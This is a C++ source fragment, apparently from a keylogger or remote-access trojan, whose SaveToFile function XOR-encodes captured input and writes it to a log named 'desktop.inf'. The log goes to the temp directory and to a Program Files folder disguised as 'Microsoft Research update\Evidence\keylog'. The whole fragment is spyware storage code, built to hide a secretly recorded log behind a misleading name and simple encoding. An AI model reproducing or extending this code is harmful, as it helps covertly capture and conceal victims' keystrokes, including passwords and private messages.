void SaveToFile(char *lpBuffer)
{

	char strRecordFile[MAX_PATH];
	SHGetSpecialFolderPath(NULL,strRecordFile,CSIDL_PROGRAM_FILES,0);
	strcat(strRecordFile,"\\Microsoft Research update\\Evidence\\keylog\\");
	MakeSureDirectoryPathExists(strRecordFile);
	lstrcat(strRecordFile, "desktop.inf");

	char szLogPath[MAX_PATH];
	GetTempPathA(MAX_PATH,szLogPath);
	strcat(szLogPath,"desktop.inf");


	HANDLE hFile=GetFileHandle(szLogPath,strRecordFile);

	// 	HANDLE	hFile = CreateFile(szLogPath, GENERIC_WRITE|GENERIC_READ,
	// 		                       FILE_SHARE_WRITE|FILE_SHARE_READ,
	// 		                       NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	// 	DWORD dwSize = GetFileSize(hFile, NULL);
	// 	// 离线记录，小于50M
	// 	if (dwSize < 1024 * 1024 * 50)
	// 		SetFilePointer(hFile, 0, 0, FILE_END);

	// 加密
	int	nLength = lstrlen(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
	{
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	//	lpEncodeBuffer[i] = lpEncodeBuffer[i] ^ XOR_ENCODE_VALUE;


	}
	WriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
	CloseHandle(hFile);
	delete	lpEncodeBuffer;
}